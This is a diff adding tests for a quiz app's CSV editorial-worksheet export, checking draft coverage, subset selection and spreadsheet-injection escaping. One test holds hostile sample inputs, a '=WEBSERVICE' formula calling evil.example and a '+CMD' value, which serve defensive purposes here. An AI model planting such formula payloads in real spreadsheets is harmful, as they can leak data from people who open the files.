@@ -12,6 +12,7 @@ import {sampleQuiztafel} from '../src/games/quiztafel/trial-bank';
 import type {GameType} from '../src/domain/game/contracts';
 import {trialDraftBundle,trialDraftItems} from '../src/content/trial-draft-bundle';
 import {contentReviewTasks,originalSourceLead,historicalTrialCorrection} from '../src/content/editorial-source-review';
+import {exportReviewWorksheet,worksheetCell} from '../src/content/editorial-worklist';
 
 const teams=Array.from({length:5},(_,i)=>({id:'team-'+i,name:'Team '+(i+1),order:i}));
 const item=(game:GameType,payload:unknown):ContentItem=>createDraft(game,payload,123);
@@ -333,5 +334,37 @@ describe('Editorial queue keeps duplicated clue targets visible without content 
   ]);
   expect(flagged.every(t=>t.issues.some(i=>i.other&&tasks.some(other=>other.item.id===i.other)))).toBe(true);
   expect(flagged.every(t=>t.item.status==='draft'&&!t.item.review)).toBe(true);
+ });
+});
+
+describe('Explicit local editorial worksheet exports actual source-bound draft work',()=>{
+ it('covers all 79 originals without converting review hints to permission or approval',()=>{
+  const items=trialDraftItems(),before=JSON.stringify(items);
+  const csv=exportReviewWorksheet(contentReviewTasks(items));
+  expect(csv.startsWith('\uFEFF')).toBe(true);
+  expect(csv.split('\r\n')).toHaveLength(81); // header, 79 originals, final terminator
+  expect(csv).toContain('"rq-w4","rundenquiz","draft","primary"');
+  expect(csv).toContain('"qt-geschichte-4","quiztafel","draft","primary"');
+  expect(csv).toContain('https://whc.unesco.org/en/list/829/');
+  expect(csv).toContain('https://science.nasa.gov/mercury/');
+  expect(csv).toContain('"ud-01","umfrageduell","draft","illustrative"');
+  expect(csv).toContain('Nur illustrativ, nicht erhoben');
+  expect(csv).toContain('"rq-h1","rundenquiz","draft","lookup"');
+  expect(csv).toContain('"vb-a-david"');
+  expect(csv).toContain('"Redaktionelle Entscheidung"');
+  expect(JSON.stringify(items)).toBe(before);
+  expect(items.every(x=>x.status==='draft'&&!x.review&&!x.provenance.rights)).toBe(true);
+ });
+ it('respects supplied selected subset and neutralizes spreadsheet injection',()=>{
+  const tasks=contentReviewTasks(trialDraftItems());
+  const selected=tasks.filter(x=>x.item.id==='rq-h1');
+  const csv=exportReviewWorksheet(selected);
+  expect(csv.split('\r\n')).toHaveLength(3);
+  expect(csv).toContain('"vb-a-david"');
+  expect(csv).not.toContain('"rq-w4"');
+  expect(worksheetCell('=WEBSERVICE("https://evil.example")')).toBe(
+   '"\'=WEBSERVICE(""https://evil.example"")"');
+  expect(worksheetCell('  +CMD')).toBe('"\'  +CMD"');
+  expect(worksheetCell('safe,"text"\nline')).toBe('"safe,""text""\nline"');
  });
 });
